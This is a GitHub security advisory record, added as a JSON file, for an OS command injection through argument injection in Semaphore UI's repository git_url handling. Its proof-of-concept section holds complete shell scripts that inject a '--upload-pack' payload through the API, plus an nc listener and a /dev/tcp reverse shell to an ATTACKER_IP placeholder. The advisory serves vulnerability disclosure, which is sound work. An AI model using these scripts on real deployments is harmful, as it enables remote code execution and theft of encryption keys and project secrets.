@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-xp7j-h7jc-4w8p",
+  "modified": "2026-09-08T18:15:03.987324521Z",
+  "published": "2026-09-08T17:57:44Z",
+  "aliases": [
+    "CVE-2026-73294",
+    "CVE-2026-73682"
+  ],
+  "summary": "Semaphore U: OS Command Injection",
+  "details": "# Summary\nAn OS command injection in repository git_url handling lets any user holding the Manager or Owner role on any project (the normal project-collaborator roles) achieve remote code execution on the Semaphore server host. Using git's --upload-pack=\u003ccmd\u003e option, an attacker runs arbitrary commands. The command executes inside the main Semaphore server process (via the schedule commit-hash poller), so it runs even when jobs are configured for remote runners — bypassing runner isolation and exposing the master encryption key and every project's secrets. Reproducible on a default install (git_client: cmd_git); no non-default configuration is required.\n\n# Details\nThe repository git_url is attacker-controlled (HTTP body) and reaches exec.Command(\"git\", ...) unvalidated. Two missing controls cause this:\n\n1. git_url is never validated against option injection.\nRepository.Validate() (db/Repository.go, ~lines 138–156) validates the branch via ValidateGitBranch (db/git_branch.go, which rejects a leading -), but performs no equivalent check on GitURL (only \"non-empty\"). ValidateRepository (db/Store.go, ~802–806) only checks the SSH key. CreateRepository (db/sql/repository.go, ~76–95) stores it verbatim. Because --upload-pack=... has no scheme:// and no leading /, GetType() (db/Repository.go, ~113–136) classifies it as RepositorySSH and GetGitURL(false) (~72–111) returns it raw/unchanged.\n\n2. The git command is built with no -- separator.\nCmdGitClient.GetLastRemoteCommitHash (db_lib/CmdGitClient.go, ~169–185) calls:\nc.output(r, GitRepositoryTmpPath, \"ls-remote\",\n           r.Repository.GetGitURL(false),   // attacker-controlled\n           r.Repository.GitBranch)          // \"master\"\noutput (~79–93) → makeCmd (~21–60): exec.Command(\"git\") (line ~27), cmd.Args = append(cmd.Args, args...) (line ~55). The resulting argv has no --:\n[\"git\", \"ls-remote\", \"--upload-pack=\u003ccmd\u003e;true\", \"master\"]\ngit parses --upload-pack=... as an option; master becomes the (local-transport) repository operand; git then executes the upload-pack value through a shell (sh -c \"\u003ccmd\u003e 'master'\"), running \u003ccmd\u003e. This is intended git behavior — the fault is Semaphore passing untrusted data as argv. (The command runs even though git subsequently prints fatal: Could not read from remote repository and exits 128, and even though master is not a real path.)\n\n### Trigger — it fires in the server process.\nA project schedule with a repository_id causes the scheduler to run git ls-remote to check for new commits. AddSchedule (api/projects/schedules.go, ~130–160; validateSchedulePayload ~86–118 validates only the cron format — it does not require the repo to be tied to the template). The schedule pool is started in the server process: runService in cli/cmd/root.go (CreateSchedulePool ~line 115, go schedulePool.Run() ~line 193), independent of remote-runner config. On each tick, ScheduleRunner.Run (services/schedules/SchedulePool.go, ~96–193, line ~117) calls tryUpdateScheduleCommitHash (~61–94) — before the HA de-dup lock (~145) — which loads the repo by repository_id and calls GetLastRemoteCommitHash(). Refresh (~265–358, line 287) registers such schedules even when inactive, so deactivating does not stop it.\n\n### Entry points:\nPOST /api/project/{id}/repositories (api/projects/repository.go:AddRepository, ~101–137) stores the payload; POST /api/project/{id}/schedules arms it. Both are gated by GetMustCanMiddleware(db.CanManageProjectResources) (api/router.go ~294/310/327), a permission held by ProjectManager/ProjectOwner (db/ProjectUser.go, ~22–27).\n\n# PoC\nEnvironment: the official semaphore v2.18.12 binary; git, python3, nc present. This PoC uses the default git client and non_admin_can_create_project: false; the attacker lowpriv is onboarded by the admin as a normal Manager (no special configuration).\n\n### Terminal 1 — config + users + server\n```\n  cd ~/PoC \u0026\u0026 mkdir -p tmp\n  cat \u003e config.json \u003c\u003cEOF\n  { \"sqlite\":{\"host\":\"$PWD/database.sqlite\"},\"dialect\":\"sqlite\",\"tmp_path\":\"$PWD/tmp\",\n    \"port\":\":3000\",\"interface\":\"127.0.0.1\",\n    \"cookie_hash\":\"$(head -c32 /dev/urandom|base64)\",\"cookie_encryption\":\"$(head -c32 /dev/urandom|base64)\",\n    \"access_key_encryption\":\"$(head -c32 /dev/urandom|base64)\",\"git_client\":\"cmd_git\",\n    \"non_admin_can_create_project\":false,\"web_host\":\"http://127.0.0.1:3000/\" }\n  EOF\n  ./semaphore user add --admin --login admin  --name Admin --email admin@example.com --password 'Admin123!'  --config config.json\n  ./semaphore user add        --login lowpriv --name Low   --email low@example.com   --password 'LowPriv123!' --config config.json\n  ./semaphore server --config config.json\n```\n### Terminal 2 — attacker listener\n```\n  nc -lvnp 4444\n```\n### Terminal 3 — admin onboards lowpriv as Manager, then lowpriv exploits\n```\n  cd ~/PoC\n\n  cat \u003e onboard.sh \u003c\u003c'EOF'\n  #!/usr/bin/env bash\n  set -euo pipefail\n  BASE=\"${BASE:-http://127.0.0.1:3000}\"\n  ADMIN=\"${ADMIN:-admin}\"; ADMIN_PASS=\"${ADMIN_PASS:-Admin123!}\"; MEMBER=\"${MEMBER:-lowpriv}\"\n  JAR=$(mktemp)\n  curl -s -c \"$JAR\" -X POST \"$BASE/api/auth/login\" -H 'Content-Type: application/json' \\\n    -d \"{\\\"auth\\\":\\\"$ADMIN\\\",\\\"password\\\":\\\"$ADMIN_PASS\\\"}\" \u003e/dev/null\n  PROJ_PID=$(curl -s -b \"$JAR\" -X POST \"$BASE/api/projects\" -H 'Content-Type: application/json' \\\n    -d '{\"name\":\"team-project\",\"alert\":false}' | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"id\"])')\n  USER_ID=$(curl -s -b \"$JAR\" \"$BASE/api/users\" | \\\n    python3 -c \"import sys,json;print(next(u['id'] for u in json.load(sys.stdin) if u['username']=='$MEMBER'))\")\n  curl -s -b \"$JAR\" -X POST \"$BASE/api/project/$PROJ_PID/users\" -H 'Content-Type: application/json' \\\n    -d \"{\\\"user_id\\\":$USER_ID,\\\"role\\\":\\\"manager\\\"}\" -o /dev/null\n  rm -f \"$JAR\"; echo \"[*] $MEMBER is Manager of project $PROJ_PID\" \u003e\u00262; echo \"$PROJ_PID\"\n  EOF\n  chmod +x onboard.sh\n\n  cat \u003e rce.sh \u003c\u003c'EOF'\n  #!/usr/bin/env bash\n  set -euo pipefail\n  BASE=\"${BASE:-http://127.0.0.1:3000}\"; LOGIN=\"${LOGIN:-lowpriv}\"; PASS=\"${PASS:-LowPriv123!}\"\n  PROJ_PID=\"${PROJ_PID:?set PROJ_PID from onboard.sh}\"\n  CMD=\"$*\"; B64=$(printf '%s' \"$CMD\" | base64 -w0)\n  GITURL=\"--upload-pack=bash -c \\\"echo $B64 | base64 -d | bash\\\";true\"\n  JAR=$(mktemp); jid(){ python3 -c 'import sys,json;print(json.load(sys.stdin)[\"id\"])'; }\n  post(){ curl -s -b \"$JAR\" -X POST \"$BASE$1\" -H 'Content-Type: application/json' -d \"$2\"; }\n  curl -s -c \"$JAR\" -X POST \"$BASE/api/auth/login\" -H 'Content-Type: application/json' \\\n    -d \"{\\\"auth\\\":\\\"$LOGIN\\\",\\\"password\\\":\\\"$PASS\\\"}\" \u003e/dev/null\n  KID=$(post /api/project/$PROJ_PID/keys \"{\\\"name\\\":\\\"k\\\",\\\"type\\\":\\\"none\\\",\\\"project_id\\\":$PROJ_PID}\" | jid)\n  BODY=$(python3 -c \"import json,sys;print(json.dumps({'name':'r','project_id':$PROJ_PID,'git_url':sys.argv[1],'git_branch':'master','ssh_key_id':$KID}))\" \"$GITURL\")\n  RID=$(post /api/project/$PROJ_PID/repositories \"$BODY\" | jid)\n  TID=$(post /api/project/$PROJ_PID/templates \"{\\\"name\\\":\\\"t\\\",\\\"project_id\\\":$PROJ_PID,\\\"app\\\":\\\"bash\\\",\\\"playbook\\\":\\\"n.sh\\\",\\\"repository_id\\\":$RID,\\\"type\\\":\\\"\\\"}\" | jid)\n  post /api/project/$PROJ_PID/schedules \"{\\\"name\\\":\\\"s\\\",\\\"project_id\\\":$PROJ_PID,\\\"template_id\\\":$TID,\\\"repository_id\\\":$RID,\\\"cron_format\\\":\\\"* * * * *\\\"}\" \u003e/dev/null\n  rm -f \"$JAR\"; echo \"[*] queued as lowpriv (Manager of $PROJ_PID): $CMD\"\n  EOF\n  chmod +x rce.sh\n\n  PROJ_PID=$(./onboard.sh)\n  ATTACKER_IP=127.0.0.1\n  PROJ_PID=$PROJ_PID ./rce.sh \"bash -i \u003e\u0026 /dev/tcp/$ATTACKER_IP/4444 0\u003e\u00261\"\n```\n\nWithin ~60 s the schedule fires and the Semaphore server process connects back to the listener (Terminal 2), giving an interactive shell as the server user. Verify with id and cat ~/PoC/config.json (the server can read its own access_key_encryption master key).\n\n# Impact\n- Type: OS command injection via argument injection — remote code execution.\n- Who is impacted: any Semaphore deployment running the default git_client: cmd_git. The attacker only needs an authenticated account holding the Manager or Owner role on any project — the standard collaborator roles. (If non_admin_can_create_project is enabled, literally any authenticated user qualifies, since they can self-create a project and become its Owner. Global admins always qualify.)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/semaphoreui/semaphore",
+        "purl": "pkg:golang/github.com/semaphoreui/semaphore"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260704181911-7e8a9434bd81"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-xp7j-h7jc-4w8p/GHSA-xp7j-h7jc-4w8p.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/semaphoreui/semaphore/security/advisories/GHSA-xp7j-h7jc-4w8p"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73294"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/semaphoreui/semaphore/commit/7e8a9434bd81b82cf42220151c74801ea97542d6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/semaphoreui/semaphore/commit/a7a7a33a64aea382a0726b3722856f298663eacf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/semaphoreui/semaphore"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/semaphoreui/semaphore/tree/v2.18.17"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/semaphoreui/semaphore/tree/v2.19.5-beta2"
+    }
+  ]
+}
